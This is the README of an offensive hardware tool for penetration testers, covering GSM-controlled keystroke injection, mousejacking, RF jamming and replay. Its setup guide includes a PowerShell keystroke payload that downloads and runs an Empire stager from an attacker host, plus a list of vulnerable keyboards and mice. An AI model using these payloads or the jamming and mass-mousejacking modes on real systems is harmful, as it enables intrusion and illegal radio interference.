[![Black Hat Arsenal Europe](https://github.com/toolswatch/badges/blob/master/arsenal/europe/2017.svg)](http://www.toolswatch.org/2018/01/black-hat-arsenal-top-10-security-tools/) [![Black Hat Arsenal USA](https://github.com/toolswatch/badges/blob/master/arsenal/usa/2018.svg)](https://www.blackhat.com/us-18/arsenal/schedule/index.html#whid-injector-and-whid-elite-a-new-generation-of-hid-offensive-devices-10459) [![ToolsWatch Best Tools](https://github.com/toolswatch/badges/blob/master/toptools/2017.svg)](http://www.toolswatch.org/2018/01/black-hat-arsenal-top-10-security-tools/) 

WHID Elite is a GSM-enabled Open-Source Multi-Purpose Offensive Device that allows a threat actor to remotely inject keystrokes, bypass air-gapped systems, conduct mousejacking attacks, do acoustic surveillance, RF replay attacks and much more. In practice, is THE Wet Dream of any Security Consultant out there!

**You can order on Aliexpress:** <https://www.aliexpress.com/item/4000357298489.html>

![image](https://user-images.githubusercontent.com/26245612/68674302-48859480-055e-11ea-9c61-b3a78238d53f.png)


Some of the main features of WHIDelite are:
- Remote control over GSM/2G Networks
- [Remote HID Injection](https://www.youtube.com/watch?v=tuoT-cPldMk)
- [Bypass Air-Gapped Environments](https://twitter.com/LucaBongiorni/status/963693468282445824)
- [Support for Mousejacking Attacks](https://twitter.com/WHID_Injector/status/1050482412218707968)
- [Radio Hacking related Attacks](https://twitter.com/WHID_Injector/status/1065332359426392068)
- [Embedded USB HUB to easily weaponize USB Gadgets](https://twitter.com/WHID_Injector/status/1067517057074380806)
- GPS Location of WHIDElite
- [Remote Audio Surveillance](https://twitter.com/WHID_Injector/status/1005464541336129536)


Hardware Design Author: Luca Bongiorni - https://twitter.com/lucabongiorni

For more information about it checkout http://elite.whid.ninja and do follow the news feed at https://twitter.com/WHID_Injector

Disclaimer: This research tool has been designed to be used ONLY by experienced personnel against targets in-scope during a Security Engagement or to raise security awareness during trainings. Neither the manufacturer, nor the Author are responsible for any damage occurred by its misuse.

# Mandatory Hardware Needed:
- **A SIM Card** able to work with a GSM/2G operator. 
	- **[NOTE]** In case you live in a country where the 2G/GSM networks are not available anymore… you will need to create your own GSM network. Which means you will need to run either OpenBTS or OpenBSC with a dedicated HW (e.g. LimeSDR, USRP, BladeRF, NanoBTS, etc.). You will just need to be able to send and receive SMS. No data traffic (i.e. GPRS/EDGE) needed at this stage.
 Said that, you can always use the standalone sketches to test indiviual features (e.g. Mousejacking, Jamming, Transmitting ASK/OOK sequences, etc.)<br/>
 
 	- **[FOR WORLD]** In case you have no National Operator that sells GSM SIMs, You can always try to check if your country is supported by https://www.thingsmobile.com Check Coverage here https://www.thingsmobile.com/business/coverage
 
	 - **[FOR US]** You can always check if your area is covered by TING, which still provides 2G network within USA  https://ting.com/shop/gsmSIM Check Coverage here https://ting.com/coverage# <br/>
 
 ![image](https://user-images.githubusercontent.com/26245612/52553931-eab8f600-2ded-11e9-9c16-18989a11fc96.png)
 
- **>= 500mAh LiPo battery** (e.g. <https://tinyurl.com/ycvf2r4x> ) 
	Beside WHID Elite itself, the only further hardware needed for testing WHID Elite is a LiPo battery of at least 500mAh (PERSONALLY I RECOMMEND >600mAh. BETTER >1000mAh). This requirement is dictated by the GSM module SIM800, which in some conditions it requires more Ampere than a standard 500mAh USB port can provide. **It is NOT recommended to run WHID-Elite WITHOUT LiPo!!!**
	
 - **JST-PH 1.25 male/female connectors** To connect the LiPo battery, I do recommend to use JST-PH 1.25 male/female connectors. Thus you will be able to easily detach it when not in use. (e.g. <https://tinyurl.com/y9kmq27b> )
 

 
# Optional Hardware Needed:

- **In case you Modded the NRF24 to use an external Antenna...** Here some possible UFL/IPEX 2.4GHz antenna I am using:
	- https://www.aliexpress.com/item/32998815857.html
	- https://www.aliexpress.com/item/32816113061.html
	- https://www.aliexpress.com/item/32504985819.html
	- https://www.aliexpress.com/item/1150268297.html
	
- **In case you would like to test the ASKTX, ASKRX and JAM commands as well, you will need an external TX connected on the D11 and/or D7 Pins[o] and the RX on the D3 pin [o]. And a test lab equipment.**
	- 433MHz OR 315MHz Transmitters (e.g. <https://www.aliexpress.com/item/1347349030.html> ) Remember to specify the vendor whether uyou need 433 or 325 MHz!!!
	- SDR device to analyze RF packets with URH (e.g. RTL-SDR, LimeSDR, HackRF, etc.)
	- Any RF enabled device (e.g. power-sockets, alarm systems, etc. Example: <https://www.aliexpress.com/item/32424721685.html> )

[o] **Wiring of external 433/315MHz TX:**<br/>
GND >> GND<br/>
DATA >> D11/D7<br/>
VCC >> VCC<br/> Use the P3 5V Vcc pin to power it. (If you are planning to use it as portable device, do use a powerbank)

[o] **Wiring of external 433/315MHz RX:**<br/>
GND >> GND<br/>
DATA >> D3<br/>
VCC >> VCC<br/> Use the P3 5V Vcc pin to power it. (If you are planning to use it as portable device, do use a powerbank)


- **In case you want to test the Mousejacking feature you will need a vulnerable keyboard:**
	- Microsoft Wireless Mouse 1000 **[TESTED, Vulnerable]**
	- Logitech Wireless Touch Keyboard K400r **[TESTED, Vulnerable]**
	- Logitech Touch Mouse T400 **[TESTED, Vulnerable]**
	- Logitech K750 Wireless Keyboard **[TESTED, Vulnerable]**
	- Microsoft Wireless Keyboard 800
	- Microsoft All-In-One Media Keyboard
	- Microsoft Sculpt Ergonomic Mouse
	- Logitech Marathon M705 Mouse
	- Logitech Wave M510 Mouse
	- Logitech Wireless Gaming Mouse G700s
	- Logitech Wireless M325 Mouse
	- Logitech K320 Wireless Keyboard
	- Dell KM636 Wireless Mouse and Keyboard
	- AmazonBasics MG-0975 Wireless Mouse

- **In case you are planning to use the dual Antenna Case, you can replace the 2G PCB antenna with the following one**
	- https://www.aliexpress.com/item/32924422554.html
	


# Pinout:

![WHID Elite Pinout v 0 9](https://user-images.githubusercontent.com/26245612/64094329-04a72f80-cd64-11e9-942b-605f30b9d7cb.jpg)

I recommend to add a switch or JST connectors between the LiPo and the PCB. Thus u can easily turn ON-OFF the board.

# How and Where to Start:

1. Take a 2G SIM card and insert into its slot.
2. Attach the antenna on the ufl connector. (this is important. Without antenna, the SIM800 will have stability issues on getting a stable connection with the Mobile Operator)
3. Connect the LiPo battery (note: it must be >500mAh for whidelite to work properly.) (For testing purposes I prefer to solder a cable with a JST connector or a switch in the middle in order to disable the LiPo on request, if not used for longer periods)
4. Install all dependencies needed to flash the firmwares.
5. Connect the WHIDElite to the PC. Check device manager or lsusb to see if WHIDElite gets recorgnizied (as LilyPad USB).
6. Flash the firmware WHID_TestSuite.ino and use SerialMonitor to see if everything works fine. To get the main menu, press ? and ENTER. Sometimes, some SIM cards already hold in it some SMSes. You will have to enumerate them with N command. And then delete each of them with command d. This will empty all SMS slots and let WHID Elite work properly.
7. in WHID_TestSuite.ino there is the command K that tests for Keystrokes injection on a Windows machine. (In the future, there will be more tests in this sketch. For now is mainly used to check if SIM800 works fine and to clean pre-existing SMSes.)
8. If everything works fine, you can flash the main firmware: WHID_Elite_x.x.x.ino. This firmware will give you access to the commands described below!
	
# Videos Tutorials [MUST WATCH]:

- Installing Dependecies and Building WHID Elite Firmwares  -  https://www.youtube.com/watch?v=X6BXdqhLbCg
- Standalone Firmwares Functionalities  -   https://www.youtube.com/watch?v=PgXCSfgdiC8

# Dependencies Needed for Flashing the Firmware:
- Arduino IDE  (tested on latest version 1.8.7 for Win) <https://www.arduino.cc/en/Main/Software>

- In Sketch > Include Library > Manage Libraries:
	
	- Install Adafruit FONA Library by Adafruit (works on latest version 1.3.3)
	
	- Install RF24 by TMRh20 (works on latest  version 1.1.7)
	
	- Install rc-switch by sui77 (works on latest  version 2.6.2)
- In Sketch > Include Library > Add .ZIP Library  install the following ZIP library https://github.com/whid-injector/whid-elite-beta/blob/master/WHID_Elite_v.1.3.0_RX_OS_B00M/FingerprintUSBHost.zip

	
# Flashing Firmware:
In Tools > Board, select LilyPad Arduino USB

![flashing_whid-elite_boards_settings](https://user-images.githubusercontent.com/26245612/47296056-d7ed9c00-d619-11e8-9791-733ab7d4c8a3.png)
![flashing_whid-elite_enable_ide_verbose_output](https://user-images.githubusercontent.com/26245612/47296062-d9b75f80-d619-11e8-9a3c-894e911a01b5.PNG)
![flashing_whid-elite_succesfully_flashed](https://user-images.githubusercontent.com/26245612/47296064-dae88c80-d619-11e8-8284-ffd40f81bc96.PNG)

# Firmwares & Sketches
Here below some of the available sketches and their description. 

## WHID_Elite_x.x.x.ino (aka MAIN SKETCH)
This is supposed to be the Main FINAL version.<br/>
That is the one you have to upload to enjoy all features/commands available!!!<br/>
If you wanna try some of the available features (i.e. mousejacking, jamming, ASK OOK TX/RX, etc.) you have to upload a Standalone Sketch. Described here below.<br/>

## Test-Suite & Standalone Sketches:
### WHID_TestSuite.ino:
WHID_TestSuite.ino is a testing suite, based on the existing one from FONA library, that allows to test if the SIM800L works properly. 
I added also the command K which is used to check if the HID emulation works properly on Windows. It will run usual calc.exe<br/>
Once uploaded the sketch, open SerialMonitor. <br/>
SIM800 will boot and you can type "?" to see the available commands.<br/>

### 315-433MHz_Transmitter.ino
Simple sketch to send an arbitrary binary sequence!<br/>
For some reasons there is a bug in rcswitch library, which adds one zero more... so remove the last one from the  binary you want to TX!!!

	Example, the right signal is:
	1010010111101011000001000 // original signal
	101001011110101100000100   // to use (see! one zero less at the end)


### Mousejacking.ino
Sketch for using WHID Elite as Mousejacking Mass Pwner Standalone Tool.<br/>
Once flashed into WHIDElite, it will automatically search and attack all vulnerable Mice & Keyboards around.<br/>
BE CAREFUL! <br/>
This is based on uCMousejack[1].<br/>
[1] https://github.com/phikshun/uC_mousejack<br/>

P.S. This standalone mode doesn't need to be plugged into a PC to work. Is enough to plug the WHID Elite on a USB-battery-pack or use a bigger LiPo (e.g. 1500mAh) and enjoy a MouseDriving session. ;] <br/>
https://twitter.com/LucaBongiorni/status/872023328487342080<br/>

By default there is a Fake Wanna Cry screen for Windows machines, setup to run into the Attack.h.<br/>
If you wanna create your own payload... go in the directory Payload_Generator_Mousejacking_Attack and run:<br/>
`python attack_generator.py payloads/wathever_rubberducky_script.txt`<br/>
And it will generate a new Attack.h that you have to place into the same directory of the Mousejacking_v.0.1.ino or WHID_Elite_x.x.x.ino<br/>

### SimpleJammer.ino
Sketch to test the Jamming feature.<br/>
You need to connect either 315/433MHz TX to D11/D7, Vcc and GND.<br/>
BE CAREFUL.<br/>
Better run it on a Faraday Cage.<br/>

### ReceiveDemo_Advanced.ino
Original sketch from rc-switch to test the RF RX feature. It requires the RX installed on D3.

### ReceiveDemo_Simple.ino
Original sketch from rc-switch to test the RF RX feature. It requires the RX installed on D3.

### Sniff-Replay.ino
Simple sketch that does RF replay attack. It sniffs, wait 10s and then replays the signal. It requires the RX installed on D3 and TX installed on D11/D7.

# Operational Features (a.k.a. commands):
I assume that at this point you have:
- Flashed WHID Elite with the WHID_Elite_1.3.x.ino
- Inserted a working SIM card
- Connected a LiPo battery 
- Plugged WHIDElite into the USB port of a target PC…

If everything is setup, you should be able to send and receive SMSes from/to WHID Elite mobile number!

# Here below a list of commands available so far:
![WHID Elite commands](https://user-images.githubusercontent.com/26245612/62884983-716c7280-bd40-11e9-972f-ecb577b56397.PNG)

I believe are self explanatory.<br/>
If you are curious to see what is happening under the hood for each command, have a look at the WHID_Elite_v.1.2.x.ino<br/>
**To enjoy them you HAVE TO use the WHID_Elite_v.1.3.x.ino!**

# Regarding ASKTX:
As the command name says, it is transmitting a very particular binary sequence through an ASK modulation with OOK encoding (by default is transmitted 1 time only). <br/>
Change "mySwitch.setRepeatTransmit(1);" to the number of times you prefer.<br/>
Why did I add this feature? Simple, sometimes you can use it to remotely fuzz existing alarm systems (i.e. most of them have known binary patterns).<br/>
To play with this feature, I strongly recommend to have at least a remote controller (i.e. garage, powers-socket, low-cost alarm systems, etc.), a cheap RTL-SDR and use URH (https://github.com/jopohl/urh) for Reverse Engineering RF signals: modulation, encoding, packets/protocols.

# Regarding JAM:
This feature is not very legal pretty much everywhere, therefore use it wisely (i.e. Faraday cage, dummy-load antenna, etc.). <br/>
By changing the frequency (Default: 15000) in "tone(11, 15000, (smsBuffer+4));" you should be able to change noise signal.<br/>	
Since the TX is nothing close to a smarter one like the CC11xx family… we are unable to set exact Jamming Freq. I know, pity, but that's for another project I am going to work in the future ;]<br/>
For WHID Elite I just wanted a basic and cheap TX to mass-jam the whole operational band of the TX in use (i.e. either 315MHz or 433MHz).<br/>


# Known Bugs:
- **Mousejacking attacks are hit-or-miss due to many variables:**<br/>
		- Distance from the target<br/>
		- RF noise around<br/>
		- The codebase I used for the attack. Is from https://github.com/insecurityofthings/uC_mousejack <br/>
- **Out of Memory issues:**
	The atmega32u4 has limited RAM which may be affected by the length of the Mousejack payload (i.e. attack[] array in attack.h).<br/>
	Usually I use simple payloads to make effective PoCs or download 1st stage agents:<br/>
```
GUI r
STRING iexplore -k http://fakeupdate.net/wnc/
ENTER
```
or
```
GUI r
DELAY 500
STRING powershell -w 1 -nop -noni -c "IEX (iwr 'https://attacker.vps/empire-stager')"
ENTER
```
P.S. According to https://www.arduino.cc/en/Tutorial/Memory is advised to use PROGMEM to store immutable arrays like that one… feel free to play with it and make PR if you need a bigger payload/array.<br/>

- **Not sure if in all OSX machines, WHID Elite's serial port is identified as cu.usbmodemHIDF1, it may need more checks.**
	If you do plug WHID Elite into an OSX-based machine… please send me the output of this command: ls /dev/cu*
- **Regarding askTX binary to transmit:**
	For some reasons there is a bug in rcswitch library, which adds one zero more... so remove the last one from the  binary you want to TX!!!<br/>
	Example, the right signal is:<br/>
	101001011110101100000100**0** // Original Signal<br/>
	101001011110101100000100   // Binary Sequence to Transmit (See! There is one zero less at the end.)<br/>


# How to report bugs:
I won't spend time explaining in depth how to report issues, since I am pretty sure you have done it tons of times. 
The main idea can be summed up in the following points:
1. Expected Behavior
2. Unexpected Behavior
3. Is the LiPo battery charged enough?
4. Is the Antenna connected properly?
5. Is the target computer an Apple Product?
6. Is the target USB port an USB3.0?
7. Eventual Explanation Notes, Screenshots, Videos, etc.

# Troubleshooting Bootloops
Sometimes, when using any Firmware that enables the SIM800L (e.g. Main Sketch), It may happen that the board goes into a bootloop [i.e. turns on (red, green and orange lights are on), then the green light start blinking (i.e. looking for 2G network) and then suddenly all lights goes off and back on]. <br>

The bootloop may be cause due some of the following reasons:
- The LiPo was not charged fully before using it. Therefore WHIDelite has not enough power to deal with initial SIM800L current absorption spikes due to the connection with the MNO (**Always charge it completely before using with WHIDelite**. Then WHIDelite can charge it autonomously once inserted intoa USB port. Usually I use this charger https://www.adafruit.com/product/1904 )
- The place where you are using WHIDelite has low 2G coverage, which makes the SIM800L encrease its transmission power, which turns into more current absorption. Either try to change place or change Mobile Netowrk Operator (MNO) SIM card, which may have better coverage in that area.
- You connected external boards (i.e. TX/RX) to P2's VCC, instead of P3. In this way those board will draw current from the internal LiPo and reduce the available current for the SIM800L to operate correctly. If you need to use WHIDelite with a Standalone Firmware... leave it as it is. Instead, if you need to use the remote control over 2G network... just connect the VCC of the external device to P3's VCC. Obviously, you will either need a battery pack connected to the USB connector or connect WHIDelite directly to a PC.
- Final rule of thumb... always try to reflash it and try on a USB port that is not 3.0 or use a 2.0 hub between WHIDelite and the 3.0 port.

# Hardware Unbrick & Hard-Reset

Incorporating all of the USB tasks on a single chip is an awesome feature that makes the WHID and boards like it truly unique. But it also places more stress on a single chip, and if anything goes wrong with that chip, the board becomes nearly unusable.
In most cases, the bricking is reversible! You just need a magnet!<br/>

The most common source of WHID “bricking” is uploading code to it with an incorrectly set board.<br/>

To revive the WHID, you’ll need to find a way to upload a sketch (even a default one is ok) to it with the board option correctly set: "Lilipad Arduino USB". We can do this with a little help from the bootloader.<br/>

First, you’ll need to set the serial port to the bootloader. But that port is only visible when the board is in bootloader mode, so pull the reset line low twice quickly to invoke the bootloader reset feature discussed above. You can quickly press the reset button** twice. While the WHID is in the bootloader mode, change the ‘Tools > Serial Port’ menu to the bootloader COM port. Quick! You’ve only got eight seconds. [On Windows, the bootloader’s COM port number is usually one number higher than the WHID’s regular port number.]

** The reset button is a HALL sensor, that means you need to place a magnet close that side of the PCB, in order to simulate the "button pressure".<br/>

- Open Arduino IDE and open ESP PRogrammer sketch
- Insert WHID Elite into USB port
- Press Upload sketch
- Start the unbrick phase with a magnet by placing it close that side of the PCB where the hall sensor is located (do it two times). >>> Close-away-close-away

Here a short video on how the magnet trick should work: https://youtu.be/-ohGYx5zBko

# Hardware Unbrick - Reinstall the Bootloader nto the Atmega 32u4

If you really fucked up everything that not even the technique above has worked... you still have a chance!<br/>
By reflashin gthe Atmega 32u4's bootloader. <br/>
Check-out the instructions at: https://www.coreforge.com/blog/2014/09/recovering-arduino-pro-micro-atmega32u4/


# Antenna Mod
The NRF24 Module is using by default the internal PCB antenna. However by moving the SMD component (a 0402/47pF capacitor) in the image below you can the route the radio signal to the UFL connector. Thus you will have to attach a 2.4GHz antenna through the UFL connector.

IMPORTANT: Do this ONLY if you know what you are doing. Obviously don't open issues nor complain to the manufacturer if you fuckup something. You got warned!

![image](https://user-images.githubusercontent.com/26245612/67474042-74e37a80-f65c-11e9-89a2-4b7f50a9a7ce.png)



